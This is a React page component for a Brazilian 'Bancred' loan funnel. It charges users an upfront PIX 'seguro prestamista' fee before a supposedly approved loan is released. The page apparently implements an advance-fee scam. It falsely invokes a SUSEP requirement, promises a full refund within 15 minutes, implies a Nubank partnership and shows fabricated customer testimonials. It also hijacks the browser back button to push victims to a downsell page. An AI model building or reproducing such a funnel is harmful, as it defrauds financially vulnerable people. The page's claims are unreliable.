import { useEffect, useMemo, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import {
  ShieldCheck,
  Info,
  Clock,
  QrCode,
  Copy,
  Check,
  Loader2,
  X,
  Wallet,
  Star,
  CheckCircle2,
  Lock,
  AlertTriangle,
  Play,
} from "lucide-react";
import { useParadisePix } from "@/hooks/useParadisePix";
import { trackEvent } from "@/lib/tracking";
import { calcularParcelaMensal } from "@/lib/loanMath";
import { valorPorExtensoReais } from "@/lib/numeroExtenso";
import bancredLogo from "@/assets/bancred-logo.png";
import cliente1 from "@/assets/cliente-1.jpeg";
import cliente2 from "@/assets/cliente-2.jpeg";
import cliente3 from "@/assets/cliente-3.jpeg";
import cliente4 from "@/assets/cliente-4.jpeg";
import cliente5 from "@/assets/cliente-5.jpeg";
import depoimentoMulher from "@/assets/depoimento-mulher.mp4";
import depoimentoHomem from "@/assets/depoimento-homem.mp4";
import depoimentoMulherThumb from "@/assets/depoimento-mulher-thumb.jpg";
import depoimentoHomemThumb from "@/assets/depoimento-homem-thumb.jpg";
import { getFunnelCustomer } from "@/lib/customer";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const PixIcon = ({ size = 20 }: { size?: number }) => (
  <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 315.63 315.63">
    <g transform="translate(-2394 -4352.093)">
      <path d="M246.13,264.53A46.07,46.07,0,0,1,213.35,251L166,203.62a9,9,0,0,0-12.44,0l-47.51,47.51A46.09,46.09,0,0,1,73.27,264.7H64l60,60a48,48,0,0,0,67.81,0l60.12-60.13Z" transform="translate(2394.023 4329.001)" fill="#fff" />
      <path d="M73.28,97.09a46.08,46.08,0,0,1,32.78,13.57l47.51,47.52a8.81,8.81,0,0,0,12.44,0l47.34-47.34a46,46,0,0,1,32.78-13.58h5.7L191.71,37.14a47.94,47.94,0,0,0-67.81,0L64,97.09Z" transform="translate(2394.023 4329.001)" fill="#fff" />
      <path d="M301.56,147l-36.33-36.33a7,7,0,0,1-2.58.52H246.13a32.62,32.62,0,0,0-22.93,9.5L175.86,168a22.74,22.74,0,0,1-32.13,0L96.21,120.51A32.62,32.62,0,0,0,73.28,111H53a7.12,7.12,0,0,1-2.44-.49L14,147a48,48,0,0,0,0,67.81l36.48,36.48a6.85,6.85,0,0,1,2.44-.49H73.28a32.63,32.63,0,0,0,22.93-9.51l47.51-47.51c8.59-8.58,23.56-8.58,32.14,0l47.34,47.33a32.62,32.62,0,0,0,22.93,9.5h16.52a6.9,6.9,0,0,1,2.58.52l36.33-36.33a47.94,47.94,0,0,0,0-67.81" transform="translate(2394.023 4329.001)" fill="#fff" />
    </g>
  </svg>
);

const DepoimentoVideo = ({ foto, video, label }: { foto: string; video: string; label: string }) => {
  const [playing, setPlaying] = useState(false);
  return (
    <div style={{ position: "relative", borderRadius: 14, overflow: "hidden", aspectRatio: "3/4", background: "#111" }}>
      {playing ? (
        <video
          src={video}
          controls
          autoPlay
          playsInline
          style={{ width: "100%", height: "100%", objectFit: "cover", display: "block", background: "#000" }}
        />
      ) : (
        <button
          type="button"
          onClick={() => setPlaying(true)}
          style={{ position: "absolute", inset: 0, padding: 0, border: "none", background: "transparent", cursor: "pointer" }}
        >
          <img src={foto} alt={label} style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }} />
          <div style={{ position: "absolute", inset: 0, background: "linear-gradient(to bottom, rgba(0,0,0,0) 50%, rgba(0,0,0,0.7) 100%)" }} />
          <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center" }}>
            <span style={{ width: 52, height: 52, borderRadius: "50%", background: "rgba(255,255,255,0.95)", display: "inline-flex", alignItems: "center", justifyContent: "center", boxShadow: "0 4px 12px rgba(0,0,0,0.3)" }}>
              <Play size={22} color="#1C68E3" fill="#1C68E3" style={{ marginLeft: 3 }} />
            </span>
          </div>
          <div style={{ position: "absolute", left: 10, bottom: 8, color: "#fff", fontSize: 12, textAlign: "left" }}>
            <div style={{ fontWeight: 700 }}>Cliente verificado</div>
            <div style={{ opacity: 0.9, fontSize: 11 }}>{label}</div>
          </div>
        </button>
      )}
    </div>
  );
};

// Valores fixos do seguro PIX para cada uma das 3 ofertas (independente do empréstimo)
const SEGURO_PRINCIPAL = 34.23;
const SEGURO_EXTRA1 = 37.32;
const SEGURO_EXTRA2 = 43.21;

// Distribuição proporcional das 3 linhas do detalhamento, mantendo a soma exata
const calcSeguroFromTotal = (total: number) => {
  // Proporções baseadas na oferta principal (13,97 / 11,91 / 8,35 = 34,23)
  const morte = +(total * (13.97 / 34.23)).toFixed(2);
  const desemprego = +(total * (11.91 / 34.23)).toFixed(2);
  const emergencia = +(total - morte - desemprego).toFixed(2);
  return { total, morte, desemprego, emergencia };
};

const calcSeguro = (_valor: number) => calcSeguroFromTotal(SEGURO_PRINCIPAL);

// Ofertas extras: valor + 2.000 e valor + 6.000
const gerarOfertasExtras = (valor: number): [number, number] => {
  return [valor + 2000, valor + 6000];
};

const beneficios = [
  "Proteção em caso de morte ou invalidez",
  "Proteção contra desemprego",
  "Liberação imediata do valor total",
  "100% reembolsável após quitação",
  "Sem carência - vale desde o 1º dia",
];

const depoimentos = [
  {
    foto: cliente1,
    nome: "Carla Mendes",
    cidade: "Salvador, BA",
    tempo: "há 2 horas",
    valor: "R$ 8.500,00",
    texto: "Confesso que estava com medo de pagar o seguro, mas em 12 minutos o dinheiro caiu na minha conta. Usei pra quitar umas dívidas atrasadas. Recomendo demais!",
  },
  {
    foto: cliente2,
    nome: "Patrícia Oliveira",
    cidade: "Belo Horizonte, MG",
    tempo: "há 5 horas",
    valor: "R$ 12.000,00",
    texto: "Já tinha tentado em vários bancos e fui negada. Aqui foi aprovado na hora, paguei o seguro pelo PIX e recebi rapidinho. Atendimento foi ótimo.",
  },
  {
    foto: cliente3,
    nome: "Beatriz Almeida",
    cidade: "Curitiba, PR",
    tempo: "há 1 dia",
    valor: "R$ 6.200,00",
    texto: "Achei que era golpe no começo kkk mas resolvi arriscar. Caiu certinho! Já indiquei pra minha mãe e pra minha irmã também.",
  },
  {
    foto: cliente4,
    nome: "Roberto Carvalho",
    cidade: "Porto Alegre, RS",
    tempo: "há 1 dia",
    valor: "R$ 15.000,00",
    texto: "Processo super transparente. O seguro me deixou tranquilo, principalmente pela proteção em caso de desemprego. Liberação foi imediata.",
  },
  {
    foto: cliente5,
    nome: "Diego Fernandes",
    cidade: "São Paulo, SP",
    tempo: "há 2 dias",
    valor: "R$ 10.000,00",
    texto: "Cara, eu tava precisando demais. Paguei o seguro 14h32 e às 14h47 já tava com o dinheiro. Surreal a velocidade.",
  },
];

const Pagamento = () => {
  const [params] = useSearchParams();
  const navigate = useNavigate();
  const valor = Number(params.get("valor") || 5000);
  const parcelas = Number(params.get("parcelas") || 24);
  const nome = params.get("nome") || "";
  const primeiroNome = nome.trim().split(" ")[0]?.toUpperCase() || "CLIENTE";
  const seguro = useMemo(() => calcSeguro(valor), [valor]);

  const [oferta, setOferta] = useState<"principal" | "extra1" | "extra2">("principal");
  const [showPix, setShowPix] = useState(false);
  const [copied, setCopied] = useState(false);

  const [valorOfertaExtra1, valorOfertaExtra2] = useMemo(() => gerarOfertasExtras(valor), [valor]);
  const seguroExtra1 = useMemo(() => calcSeguroFromTotal(SEGURO_EXTRA1), []);
  const seguroExtra2 = useMemo(() => calcSeguroFromTotal(SEGURO_EXTRA2), []);

  const valorAtual =
    oferta === "principal" ? valor : oferta === "extra1" ? valorOfertaExtra1 : valorOfertaExtra2;
  const seguroAtual =
    oferta === "principal" ? seguro : oferta === "extra1" ? seguroExtra1 : seguroExtra2;

  const parcela = (v: number) => calcularParcelaMensal(v, parcelas);

  // Back redirect: ao pressionar voltar, envia para /downsell preservando o valor
  useEffect(() => {
    window.history.pushState({ backRedirect: true }, "");
    const onPop = () => {
      const qs = new URLSearchParams();
      qs.set("valor", String(valor));
      if (nome) qs.set("nome", nome);
      window.location.replace(`/downsell?${qs.toString()}`);
    };
    window.addEventListener("popstate", onPop);
    return () => window.removeEventListener("popstate", onPop);
  }, [valor, nome]);

  const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
    trackEvent({
      event: "CompletePayment",
      value: seguroAtual.total,
      currency: "BRL",
      contents: [{ content_id: "seguro", content_name: "Seguro Prestamista", quantity: 1, price: seguroAtual.total }],
    });
    navigate(`/up1?${params.toString()}`);
  });

  const openPix = async () => {
    setShowPix(true);
    trackEvent({
      event: "InitiateCheckout",
      value: seguroAtual.total,
      currency: "BRL",
      contents: [{ content_id: "seguro", content_name: "Seguro Prestamista", quantity: 1, price: seguroAtual.total }],
    });
    try {
      await create({
        amountCents: Math.round(seguroAtual.total * 100),
        description: `Seguro Prestamista - Bancred (${formatBRL(valorAtual)})`,
        stage: "seguro",
        customer: getFunnelCustomer(params),
      });
    } catch {
      /* erro tratado pelo hook */
    }
  };

  const closePix = () => {
    setShowPix(false);
    reset();
    setCopied(false);
  };

  const handleCopy = async () => {
    if (!pix?.qr_code) return;
    try {
      await navigator.clipboard.writeText(pix.qr_code);
      setCopied(true);
      setTimeout(() => setCopied(false), 2200);
    } catch {
      /* ignore */
    }
  };

  const OfferRow = ({
    id,
    valorEmp,
    seg,
    principal,
  }: {
    id: "principal" | "extra1" | "extra2";
    valorEmp: number;
    seg: ReturnType<typeof calcSeguro>;
    principal?: boolean;
  }) => {
    const active = oferta === id;
    return (
      <button
        type="button"
        onClick={() => setOferta(id)}
        style={{
          width: "100%",
          background: "#fff",
          border: `2px solid ${active ? "#1C68E3" : "#E5E7EB"}`,
          borderRadius: 14,
          padding: 14,
          textAlign: "left",
          cursor: "pointer",
          fontFamily: fontStack,
          marginBottom: 10,
          transition: "border-color 0.2s",
        }}
      >
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
          <div style={{ display: "flex", alignItems: "flex-start", gap: 10, flex: 1 }}>
            <span
              style={{
                width: 18,
                height: 18,
                borderRadius: "50%",
                border: `2px solid ${active ? "#1C68E3" : "#D1D5DB"}`,
                display: "inline-flex",
                alignItems: "center",
                justifyContent: "center",
                flexShrink: 0,
                marginTop: 4,
                background: active ? "#fff" : "transparent",
              }}
            >
              {active && <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#1C68E3" }} />}
            </span>
            <div>
              <div style={{ fontSize: 12, color: "#6B7280", marginBottom: 2 }}>
                {principal ? "Valor aprovado para liberação" : "Você receberá"}
              </div>
              <div style={{ fontSize: 22, fontWeight: 800, color: "#1C68E3", letterSpacing: -0.5 }}>
                {formatBRL(valorEmp)}
              </div>
              <div style={{ fontSize: 11, color: "#6B7280", marginTop: 2 }}>
                {parcelas}x de {formatBRL(parcela(valorEmp))}
              </div>
            </div>
          </div>
          <div style={{ textAlign: "right" }}>
            <div style={{ fontSize: 11, color: "#6B7280" }}>Seguro</div>
            <div style={{ fontSize: 18, fontWeight: 800, color: "#16A34A" }}>{formatBRL(seg.total)}</div>
          </div>
        </div>
      </button>
    );
  };

  return (
    <div style={{ minHeight: "100dvh", background: "#F4F4F7", fontFamily: fontStack, color: "#111827", paddingBottom: showPix ? 0 : 32 }}>
      {/* Header Bancred */}
      <header style={{ background: "#fff", padding: "18px 16px", textAlign: "center", borderBottom: "1px solid #E5E7EB" }}>
        <img src={bancredLogo} alt="Bancred" style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }} />
      </header>

      {/* Banner Nu × Bancred */}
      <section style={{ background: "linear-gradient(135deg, #820AD1 0%, #6E07B0 100%)", padding: "22px 16px 24px", color: "#fff", textAlign: "center" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 14, marginBottom: 6 }}>
          <span style={{ fontFamily: "Inter, sans-serif", fontSize: 30, fontWeight: 900, letterSpacing: -1.5, lineHeight: 1, color: "#fff" }}>nu</span>
          <X size={18} strokeWidth={2.5} />
          <span style={{ fontSize: 22, fontWeight: 800, letterSpacing: -0.4 }}>Bancred</span>
        </div>
        <div style={{ fontSize: 13, opacity: 0.92 }}>Parceria oficial · Proteção garantida</div>
      </section>

      <main style={{ padding: "22px 14px", maxWidth: 480, margin: "0 auto" }}>
        {/* Saudação */}
        <h1 style={{ fontSize: 26, fontWeight: 800, textAlign: "center", marginBottom: 6, letterSpacing: -0.5 }}>
          {primeiroNome}!
        </h1>
        <p style={{ fontSize: 15, color: "#374151", textAlign: "center", marginBottom: 22 }}>
          Seu empréstimo está quase liberado
        </p>

        {/* Alerta SUSEP */}
        <div style={{ background: "#FEF3C7", borderLeft: "4px solid #F59E0B", borderRadius: 14, padding: 16, marginBottom: 14 }}>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, background: "#B45309", color: "#fff", fontSize: 11, fontWeight: 800, padding: "5px 10px", borderRadius: 6, letterSpacing: 0.5, marginBottom: 12 }}>
            <AlertTriangle size={12} /> LEIA COM ATENÇÃO
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
            <span style={{ width: 36, height: 36, borderRadius: 10, background: "#F59E0B", color: "#fff", display: "inline-flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <AlertTriangle size={18} />
            </span>
            <div style={{ fontSize: 15, fontWeight: 700, color: "#78350F" }}>Por que o seguro é obrigatório</div>
          </div>
          <div style={{ fontSize: 13.5, color: "#78350F", lineHeight: 1.55 }}>
            Exigência da <span style={{ background: "#FDE68A", padding: "1px 6px", borderRadius: 4, fontWeight: 700 }}>SUSEP</span> para liberação de crédito <strong>sem comprovação de renda</strong>. Garante a quitação total em caso de morte, invalidez ou desemprego.
          </div>
        </div>

        {/* Você recebe 100% de volta */}
        <div style={{ background: "#fff", border: "1px solid #E5E7EB", borderRadius: 14, padding: 16, marginBottom: 18 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
            <span style={{ width: 36, height: 36, borderRadius: 10, background: "#DCFCE7", color: "#16A34A", display: "inline-flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <Wallet size={18} />
            </span>
            <div style={{ fontSize: 15, fontWeight: 700, color: "#111827" }}>Você recebe 100% de volta</div>
          </div>
          <div style={{ fontSize: 13.5, color: "#374151", lineHeight: 1.55, marginBottom: 12 }}>
            O seguro é <strong>integralmente reembolsado</strong> e cai na sua conta junto com o valor do empréstimo, em até 15 minutos após o PIX.
          </div>
          <div style={{ background: "#F9FAFB", border: "1px solid #E5E7EB", borderRadius: 10, padding: "10px 12px", display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#111827" }}>
            <CheckCircle2 size={16} color="#16A34A" style={{ flexShrink: 0 }} />
            <span>Você recebe: <strong>valor aprovado + seguro de volta</strong></span>
          </div>
        </div>

        {/* Benefícios */}
        <div style={{ background: "#fff", border: "1px solid #E5E7EB", borderRadius: 16, padding: 18, marginBottom: 18 }}>
          <div style={{ fontSize: 15, fontWeight: 700, marginBottom: 12 }}>Benefícios inclusos no seguro:</div>
          {beneficios.map((b) => (
            <div key={b} style={{ display: "flex", alignItems: "center", gap: 10, padding: "7px 0", fontSize: 14, color: "#111827" }}>
              <CheckCircle2 size={18} color="#16A34A" style={{ flexShrink: 0 }} /> {b}
            </div>
          ))}
        </div>

        {/* Social proof */}
        <div style={{ background: "#fff", border: "1px solid #E5E7EB", borderRadius: 16, padding: 18, marginBottom: 18 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 15, fontWeight: 700, marginBottom: 14 }}>
            <Star size={18} color="#F59E0B" fill="#F59E0B" /> Quem já recebeu está falando
          </div>
          {depoimentos.map((d, idx) => (
            <div key={d.nome} style={{ background: "#F9FAFB", border: "1px solid #F3F4F6", borderRadius: 12, padding: 14, marginBottom: idx === depoimentos.length - 1 ? 0 : 12 }}>
              <div style={{ display: "flex", alignItems: "flex-start", gap: 12, marginBottom: 10 }}>
                <img src={d.foto} alt={d.nome} style={{ width: 48, height: 48, borderRadius: "50%", objectFit: "cover", flexShrink: 0 }} />
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 14, fontWeight: 700, color: "#111827" }}>
                    {d.nome}
                    <span style={{ width: 14, height: 14, borderRadius: "50%", background: "#1C68E3", display: "inline-flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                      <Check size={9} color="#fff" strokeWidth={4} />
                    </span>
                  </div>
                  <div style={{ fontSize: 12, color: "#6B7280", marginTop: 2 }}>
                    {d.cidade} · {d.tempo}
                  </div>
                  <div style={{ display: "flex", gap: 1, marginTop: 4, color: "#F59E0B" }}>
                    {[1, 2, 3, 4, 5].map((s) => (
                      <Star key={s} size={12} fill="#F59E0B" stroke="#F59E0B" />
                    ))}
                  </div>
                </div>
                <span style={{ fontSize: 12, fontWeight: 700, color: "#fff", background: "#16A34A", padding: "5px 10px", borderRadius: 8, whiteSpace: "nowrap" }}>
                  {d.valor}
                </span>
              </div>
              <div style={{ fontSize: 13, color: "#374151", lineHeight: 1.55 }}>{d.texto}</div>
            </div>
          ))}
        </div>

        {/* Oferta principal */}
        <OfferRow id="principal" valorEmp={valor} seg={seguro} principal />

        {/* Detalhamento da tarifa */}
        <div style={{ background: "#fff", border: "1px solid #E5E7EB", borderRadius: 16, padding: 16, marginBottom: 18 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12, color: "#1C68E3", fontWeight: 700, fontSize: 14 }}>
            <Info size={16} /> Detalhamento da Tarifa do Seguro
          </div>
          {[
            { l: "Cobertura por morte e invalidez", v: seguroAtual.morte },
            { l: "Proteção contra desemprego", v: seguroAtual.desemprego },
            { l: "Assistência 24h emergencial", v: seguroAtual.emergencia },
          ].map((it) => (
            <div key={it.l} style={{ display: "flex", justifyContent: "space-between", padding: "8px 0", fontSize: 13, color: "#374151", borderBottom: "1px dashed #F3F4F6" }}>
              <span>{it.l}</span>
              <span style={{ fontWeight: 600, color: "#111827" }}>{formatBRL(it.v)}</span>
            </div>
          ))}
          <div style={{ display: "flex", justifyContent: "space-between", paddingTop: 12, marginTop: 6, borderTop: "1px solid #E5E7EB", fontSize: 14, fontWeight: 700 }}>
            <span>Total do seguro</span>
            <span style={{ color: "#16A34A" }}>{formatBRL(seguroAtual.total)}</span>
          </div>
        </div>

        {/* Ofertas extras */}
        <h2 style={{ fontSize: 15, fontWeight: 700, marginBottom: 12 }}>
          Temos mais 2 ofertas aprovadas pra seu CPF:
        </h2>
        <OfferRow id="extra1" valorEmp={valorOfertaExtra1} seg={seguroExtra1} />
        <OfferRow id="extra2" valorEmp={valorOfertaExtra2} seg={seguroExtra2} />

        {/* Valor a pagar destacado */}
        <div style={{ textAlign: "center", marginTop: 24, marginBottom: 14 }}>
          <div style={{ fontSize: 34, fontWeight: 800, color: "#16A34A", letterSpacing: -0.6 }}>
            {formatBRL(seguroAtual.total)}
          </div>
          <div style={{ fontSize: 13, color: "#6B7280", marginTop: 2 }}>Pagamento único via PIX</div>
        </div>

        {/* Veja quem já recebeu */}
        <div style={{ display: "inline-flex", alignItems: "center", gap: 8, justifyContent: "center", width: "100%", fontSize: 12, fontWeight: 800, color: "#6B7280", letterSpacing: 1, marginBottom: 12 }}>
          <Star size={14} color="#F59E0B" fill="#F59E0B" /> VEJA QUEM JÁ RECEBEU
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 14 }}>
          {[
            { foto: depoimentoMulherThumb, video: depoimentoMulher, label: "Recebeu via PIX" },
            { foto: depoimentoHomemThumb, video: depoimentoHomem, label: "Empréstimo aprovado" },
          ].map((v) => (
            <DepoimentoVideo key={v.label} foto={v.foto} video={v.video} label={v.label} />
          ))}
        </div>
        <div style={{ textAlign: "center", fontSize: 12, color: "#6B7280", marginBottom: 18 }}>
          Toque para assistir • Depoimentos reais
        </div>

        <button
          type="button"
          onClick={openPix}
          style={{
            width: "100%",
            padding: "16px 20px",
            background: "#16A34A",
            color: "#fff",
            border: "none",
            borderRadius: 14,
            fontSize: 16,
            fontWeight: 700,
            cursor: "pointer",
            boxShadow: "0 10px 24px rgba(22,163,74,0.32)",
            display: "inline-flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 10,
            fontFamily: fontStack,
            minHeight: 56,
          }}
        >
          <PixIcon size={22} /> Garantir empréstimo de {Math.round(valorAtual / 1000)} mil
        </button>

        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 6, marginTop: 14, fontSize: 12, color: "#6B7280" }}>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6 }}>
            <CheckCircle2 size={14} color="#16A34A" /> Pagamento reconhecido automaticamente
          </div>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6 }}>
            <Lock size={13} color="#6B7280" /> Processo 100% seguro
          </div>
        </div>
      </main>

      {showPix && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(15,23,42,0.55)",
            backdropFilter: "blur(2px)",
            display: "flex",
            alignItems: "flex-end",
            justifyContent: "center",
            zIndex: 60,
          }}
          onClick={closePix}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              background: "#fff",
              width: "100%",
              maxWidth: 480,
              borderTopLeftRadius: 22,
              borderTopRightRadius: 22,
              padding: "14px 18px 24px",
              maxHeight: "92dvh",
              overflowY: "auto",
              fontFamily: fontStack,
            }}
          >
            <div style={{ width: 44, height: 4, background: "#E5E7EB", borderRadius: 2, margin: "0 auto 14px" }} />

            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <span style={{ background: "#32BCAD", borderRadius: 8, padding: 4, display: "inline-flex" }}>
                  <PixIcon size={18} />
                </span>
                <span style={{ fontSize: 18, fontWeight: 700 }}>Pagar com PIX</span>
              </div>
              <button
                type="button"
                onClick={closePix}
                aria-label="Fechar"
                style={{ background: "transparent", border: "none", cursor: "pointer", color: "#6B7280" }}
              >
                <X size={22} />
              </button>
            </div>

            <div
              style={{
                background: "#F0FDF4",
                border: "1px solid #DCFCE7",
                borderRadius: 14,
                padding: "12px 14px",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 18,
              }}
            >
              <div>
                <div style={{ fontSize: 12, color: "#15803D", fontWeight: 600 }}>Valor a pagar</div>
                <div style={{ fontSize: 24, fontWeight: 800, color: "#16A34A", letterSpacing: -0.4 }}>
                  {formatBRL(seguroAtual.total)}
                </div>
              </div>
              <div
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 6,
                  background: "#fff",
                  border: "1px solid #DCFCE7",
                  color: "#15803D",
                  fontSize: 12,
                  fontWeight: 600,
                  padding: "6px 10px",
                  borderRadius: 999,
                }}
              >
                <Clock size={12} /> expira em 15min
              </div>
            </div>

            {pixLoading || !pix ? (
              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "40px 0" }}>
                <Loader2 size={42} color="#1C68E3" style={{ animation: "spin 1s linear infinite" }} />
                <div style={{ marginTop: 18, color: "#6B7280", fontSize: 14 }}>
                  {pixError ? pixError : "Gerando seu código PIX..."}
                </div>
                <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
              </div>
            ) : (
              <>
                <div style={{ fontSize: 13, color: "#374151", lineHeight: 1.6, marginBottom: 14 }}>
                  Abra o app do seu banco e acesse a área PIX.<br />
                  Escolha <strong>Ler QR Code</strong> ou <strong>PIX Copia e Cola</strong>.<br />
                  Confirme o valor e finalize o pagamento.
                </div>

                <div style={{ background: "#F9FAFB", border: "1px solid #E5E7EB", borderRadius: 14, padding: 16, marginBottom: 14 }}>
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, color: "#374151", fontSize: 13, fontWeight: 600, marginBottom: 12 }}>
                    <QrCode size={14} /> Escaneie o QR Code
                  </div>
                  <div style={{ display: "flex", justifyContent: "center" }}>
                    <img
                      src={pix.qr_image}
                      alt="QR Code PIX"
                      width={240}
                      height={240}
                      style={{ display: "block", background: "#fff", padding: 8, borderRadius: 8 }}
                    />
                  </div>
                </div>

                <div style={{ fontSize: 13, fontWeight: 600, color: "#111827", marginBottom: 6 }}>Ou use o PIX Copia e Cola:</div>
                <div
                  style={{
                    background: "#F9FAFB",
                    border: "1px solid #E5E7EB",
                    borderRadius: 12,
                    padding: 12,
                    fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace",
                    fontSize: 12,
                    color: "#111827",
                    wordBreak: "break-all",
                    lineHeight: 1.5,
                    marginBottom: 12,
                  }}
                >
                  {pix.qr_code}
                </div>

                <button
                  type="button"
                  onClick={handleCopy}
                  style={{
                    width: "100%",
                    padding: "14px 18px",
                    background: copied ? "#16A34A" : "#1C68E3",
                    color: "#fff",
                    border: "none",
                    borderRadius: 12,
                    fontSize: 15,
                    fontWeight: 700,
                    cursor: "pointer",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 8,
                    fontFamily: fontStack,
                    minHeight: 50,
                  }}
                >
                  {copied ? <Check size={18} /> : <Copy size={18} />} {copied ? "Copiado!" : "Copiar código PIX"}
                </button>

                <div
                  style={{
                    marginTop: 12,
                    background: "#EFF6FF",
                    border: "1px solid #DBEAFE",
                    borderRadius: 12,
                    padding: "12px 14px",
                    display: "flex",
                    alignItems: "center",
                    gap: 10,
                    color: "#1751B5",
                    fontSize: 13,
                  }}
                >
                  <Loader2 size={16} style={{ animation: "spin 1.4s linear infinite", flexShrink: 0 }} />
                  Aguardando confirmação do pagamento...
                </div>

                <div style={{ marginTop: 14, fontSize: 11.5, color: "#6B7280", textAlign: "center", lineHeight: 1.55, display: "inline-flex", alignItems: "flex-start", gap: 6 }}>
                  <Wallet size={12} style={{ marginTop: 2, flexShrink: 0 }} />
                  <span>
                    Após o pagamento, o valor é liberado automaticamente. Pagamento processado com criptografia ponta a ponta.
                  </span>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Pagamento;
